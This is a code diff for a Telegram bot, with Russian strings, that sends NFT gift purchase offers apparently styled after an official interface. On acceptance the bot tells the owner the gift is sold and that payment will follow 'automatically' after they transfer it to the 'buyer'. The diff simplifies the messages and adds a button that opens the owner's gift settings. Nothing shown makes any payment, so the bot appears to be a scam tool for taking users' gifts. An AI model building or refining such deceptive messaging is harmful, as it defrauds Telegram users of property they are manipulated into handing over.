@@ -68,6 +68,7 @@ async def send_offer(message: Message):
     nft_prefix, separator, nft_number = nft_slug.rpartition("-")
     nft_name = f"{nft_prefix} #{nft_number}" if separator and nft_number.isdigit() else nft_slug
 
+    # Просто пишем @username. Telegram сам сделает его ссылкой.
     sender_username = message.from_user.username
     if sender_username:
         sender_display = f"@{sender_username}"
@@ -77,6 +78,7 @@ async def send_offer(message: Message):
     nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
+    # ТЕКСТ КАК НА СКРИНШОТЕ
     offer_text = (
         f"<b>Пользователь {sender_display} предлагает Вам {amount} {currency_display} за подарок {nft_link}.</b>\n\n"
         f"<b>Предложение действует ещё 5ч 59м.</b>\n"
@@ -128,22 +130,20 @@ async def on_accept_offer(callback: CallbackQuery):
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username")
 
-    # Делаем NFT кликабельным в тексте "успешно продан"
     nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
     new_text = (
-        f"<b>Подарок: {nft_link} успешно продан!</b>\n\n"
-        f"<b>Перевод средств инициирован.</b>\n"
-        f"<b>Пожалуйста, передайте указанный NFT-подарок напрямую на аккаунт покупателя {target_account} для завершения транзакции.</b>\n\n"
-        f"<b>После подтверждения передачи, средства будут зачислены на ваш баланс автоматически.</b>\n"
+        f"<b>Подарок успешно продан {nft_link}.</b>\n\n"
+        f"<b>• Передайте подарок {target_account} для завершения сделки.</b>\n\n"
+        f"<b>После передачи подарка вам автоматически зачислятся {amount} {currency_display} на ваш баланс.</b>\n"
         f"{hidden_link}"
     )
 
     new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Как передать?", callback_data="send_transfer")],
-        [InlineKeyboardButton(text="Confirm Transfer", callback_data="confirm_transfer")]
+        [InlineKeyboardButton(text="Передать", url="tg://settings/my-profile/gifts")],
+        [InlineKeyboardButton(text="Как передать?", callback_data="send_transfer")]
     ])
 
     await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
@@ -172,116 +172,16 @@ async def on_accept_offer(callback: CallbackQuery):
 # --- ОБРАБОТЧИК "КАК ПЕРЕДАТЬ?" ---
 @dispatcher.callback_query(F.data == "send_transfer")
 async def on_send_transfer(callback: CallbackQuery):
-    global last_message_id
-    nft_name = last_offer_data.get("nft_name", "NFT")
-    amount = last_offer_data.get("amount", "0")
-    currency_display = last_offer_data.get("currency_display", "Stars")
-    link = last_offer_data.get("link", "")
-    conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username")
-
-    # Делаем NFT кликабельным в инструкции
-    nft_link = f'<a href="{link}">{nft_name}</a>'
-    hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
-    instruction_text = (
-        f"<b>Инструкция по передаче подарка</b>\n\n"
-        f"<b>1.</b> Откройте Профиль -> Подарки в Telegram.\n"
-        f"<b>2.</b> Выберите {nft_link} в своём списке.\n"
-        f"<b>3.</b> Нажмите «Передать», затем укажите получателя <b>{target_account}</b>.\n"
-        f"<b>4.</b> Проверьте данные и подтвердите отправку.\n\n"
-        f"<b>Автоматическое завершение сделки</b>\n"
-        f"После подтверждения передачи NFT-подарка на <b>{target_account}</b> система обновит статус сделки, а сумма <b>{amount} {currency_display}</b> станет доступна продавцу.\n"
-        f"{hidden_link}"
-    )
-
-    instruction_keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="Назад", callback_data="back_from_instruction")
-    ]])
-
-    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
-    if last_message_id:
-        await safe_delete(callback.message.chat.id, last_message_id, conn_id)
-
-    try:
-        msg = await bot.send_message(
-            chat_id=callback.message.chat.id,
-            text=instruction_text,
-            reply_markup=instruction_keyboard,
-            business_connection_id=conn_id,
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=False,
-                prefer_large_media=True,
-                show_above_text=True
-            )
-        )
-        last_message_id = msg.message_id
-    except Exception as e:
-        print(f"Ошибка отправки: {e}")
-            
-    await callback.answer()
-
-# --- ОБРАБОТЧИК "НАЗАД" ---
-@dispatcher.callback_query(F.data == "back_from_instruction")
-async def back_from_instruction(callback: CallbackQuery):
-    global last_message_id
-    nft_name = last_offer_data.get("nft_name", "NFT")
-    amount = last_offer_data.get("amount", "0")
-    currency_display = last_offer_data.get("currency_display", "Stars")
-    link = last_offer_data.get("link", "")
-    conn_id = last_offer_data.get("business_connection_id")
-    sender_username = last_offer_data.get("sender_username")
-
-    nft_link = f'<a href="{link}">{nft_name}</a>'
-    hidden_link = f'<a href="{link}">&#8203;</a>'
-    target_account = f"@{sender_username}" if sender_username else "покупателю"
-
-    back_text = (
-        f"<b>Подарок: {nft_link} успешно продан!</b>\n\n"
-        f"<b>Перевод средств инициирован.</b>\n"
-        f"<b>Пожалуйста, передайте указанный NFT-подарок напрямую на аккаунт покупателя {target_account} для завершения транзакции.</b>\n\n"
-        f"<b>После подтверждения передачи, средства будут зачислены на ваш баланс автоматически.</b>\n"
-        f"{hidden_link}"
-    )
-
-    back_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Как передать?", callback_data="send_transfer")],
-        [InlineKeyboardButton(text="Confirm Transfer", callback_data="confirm_transfer")]
-    ])
-
-    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
-    if last_message_id:
-        await safe_delete(callback.message.chat.id, last_message_id, conn_id)
-
-    try:
-        msg = await bot.send_message(
-            chat_id=callback.message.chat.id,
-            text=back_text,
-            reply_markup=back_keyboard,
-            business_connection_id=conn_id,
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=False,
-                prefer_large_media=True,
-                show_above_text=True
-            )
-        )
-        last_message_id = msg.message_id
-    except Exception as e:
-        print(f"Ошибка отправки: {e}")
-            
-    await callback.answer()
-
-# --- ОБРАБОТЧИК "CONFIRM TRANSFER" ---
-@dispatcher.callback_query(F.data == "confirm_transfer")
-async def on_confirm_transfer(callback: CallbackQuery):
-    amount = last_offer_data.get("amount", "0")
-    currency_display = last_offer_data.get("currency_display", "Stars")
     alert_text = (
-        f"Передача пока не подтверждена. Сумма "
-        f"предложения: {amount} {currency_display}. Дождитесь "
-        f"проверки."
+        f"1. Нажмите «Передать» под сообщением.\n"
+        f"2. Перейдите в «Мои подарки» и выберите NFT.\n"
+        f"3. Нажмите «Передать», выберите получателя и передайте подарок.\n\n"
+        f"Нет в контактах? Найдите по {target_account}"
     )
+    
     await callback.answer(alert_text, show_alert=True)
 
 # --- ОБРАБОТЧИК "ОТКЛОНИТЬ" ---
